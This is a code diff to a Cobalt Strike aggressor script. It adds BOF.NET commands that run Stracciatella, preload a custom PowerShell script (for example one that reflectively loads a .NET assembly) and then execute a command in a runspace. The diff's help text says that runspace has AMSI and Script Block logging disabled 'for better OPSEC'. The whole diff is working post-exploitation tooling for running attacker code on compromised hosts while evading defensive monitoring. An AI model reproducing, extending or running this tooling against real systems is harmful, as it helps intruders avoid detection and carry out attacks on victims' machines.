@@ -63,14 +63,19 @@ beacon_command_register(
     "Use: bofnet_stracciatella [-v] <command>\n\nDescription: Runs Stracciatella via bofnet_jobassembly (if one is used).\nIf '-v' is given, will result in verbose output from Stracciatella.\nThat will create a Powershell Runspace with Script Block logging and AMSI disabled for better OPSEC.");
 
 beacon_command_register(
+    "bofnet_stracciatella_script",
+    "(non-blocking) Preloads a specified Powershell script and launches given command with parameters via BOF.NET bofnet_jobassembly",
+    "Use: bofnet_stracciatella_script [-v] <scriptpath> <command>\n\nDescription: This function at a single run preloads a specified custom\nPowershell script and adds separator (semicolon) followed by <command> to run.\nUseful when we need to provide a Powershell script that for instance reflectively loads .NET assembly (Import-Module)\nand then we need to invoke that loaded module.\nStracciatella will be loaded via bofnet_jobassembly");
+
+beacon_command_register(
     "bofnet_executestracciatella",
     "(blocking) Runs Powershell commands in a safe Stracciatella runspace via BOF.NET bofnet_executeassembly",
     "Use: bofnet_stracciatella [-v] <command>\n\nDescription: Runs Stracciatella via bofnet_executeassembly (if one is used).\nIf '-v' is given, will result in verbose output from Stracciatella.\nThat will create a Powershell Runspace with Script Block logging and AMSI disabled for better OPSEC.");
 
 beacon_command_register(
-    "bofnet_stracciatella_script",
-    "Preloads a specified Powershell script and launches given command with parameters (via BOF.NET).",
-    "Use: bofnet_stracciatella_script <scriptpath> <command>\n\nDescription: This function at a single run preloads a specified custom\nPowershell script and adds separator (semicolon) followed by <command> to run.\nUseful when we need to provide a Powershell script that for instance reflectively loads .NET assembly (Import-Module)\nand then we need to invoke that loaded module.\nStracciatella will be loaded via bofnet_jobassembly");
+    "bofnet_executestracciatella_script",
+    "(blocking) Preloads a specified Powershell script and launches given command with parameters via BOF.NET bofnet_executeassembly",
+    "Use: bofnet_executestracciatella_script [-v] <scriptpath> <command>\n\nDescription: This function at a single run preloads a specified custom\nPowershell script and adds separator (semicolon) followed by <command> to run.\nUseful when we need to provide a Powershell script that for instance reflectively loads .NET assembly (Import-Module)\nand then we need to invoke that loaded module.\nStracciatella will be loaded via bofnet_executeassembly");
 
 
 $has_bofnet_commands = false;
@@ -375,13 +380,16 @@ sub runStracciatella {
             $msg = "with imported script ( $+ " . getFileName(%IMPORTED_SCRIPTS[$1]) . " $+ )";
         }
     }
+    if(strlen($enc) >= 20000 && $mode == true && $job == $false) {
+        berror($1, "bofnet_executestracciatella_script does not accept compressed scripts larger then 20000 bytes. The current compressed script is " . strlen($enc) . " bytes ");
+    } else {
+        if($machine eq ".") {
+            executeAssembly($1, $STRACCIATELLA_PATH, $opts, $firstScriptBytes, $msg, $mode, $job);
+        }
 
-    if($machine eq ".") {
-        executeAssembly($1, $STRACCIATELLA_PATH, $opts, $firstScriptBytes, $msg, $mode, $job);
-    }
-
-    if(strlen($enc) >= 20000) {
-        writePipe($1, $machine, $pipename, $enc);
+        if(strlen($enc) >= 20000) {
+            writePipe($1, $machine, $pipename, $enc);
+        }
     }
 }
 
@@ -570,6 +578,39 @@ alias bofnet_stracciatella_script {
 
     if(($pos is $null) || ($pos + 1) > strlen($args)) {
         berror($1, "Usage: bofnet_stracciatella_script [-v] <path> <command>\n\nNo path or command specified to run stracciatella with preloaded custom script.");
+        return;
+    }
+
+    $customScript = substr($args, 0, $pos);
+    $args = substr($args, $pos + 1);
+
+    $pipename = [java.util.UUID randomUUID];
+    runStracciatella($1, $verbose, ".", $pipename, $args, $customScript, true, true);
+}
+
+alias bofnet_executestracciatella_script {
+    local('$args0 $args $verbose $pipename');
+
+    if($has_bofnet_commands == false) {
+        berror($1, "There is no BOF.NET loaded in Cobalt Strike. Try (re-)loading bofnet.cna and stracciatella.cna before using this.");
+        return;
+    }
+
+    $args0 = substr($0, strlen("bofnet_executestracciatella_script "));
+    $args = $args0;
+
+    println("bofnet_executestracciatella_script $args0");
+
+    $verbose = "";
+    if ('bofnet_executestracciatella_script -v *' iswm $0) {
+        $verbose = "-v ";
+        $args = substr($0, strlen("bofnet_executestracciatella_script -v "));
+    }
+
+    $pos = indexOf($args, " ", 0);
+
+    if(($pos is $null) || ($pos + 1) > strlen($args)) {
+        berror($1, "Usage: bofnet_executestracciatella_script [-v] <path> <command>\n\nNo path or command specified to run stracciatella with preloaded custom script.");
         return;
     }
 
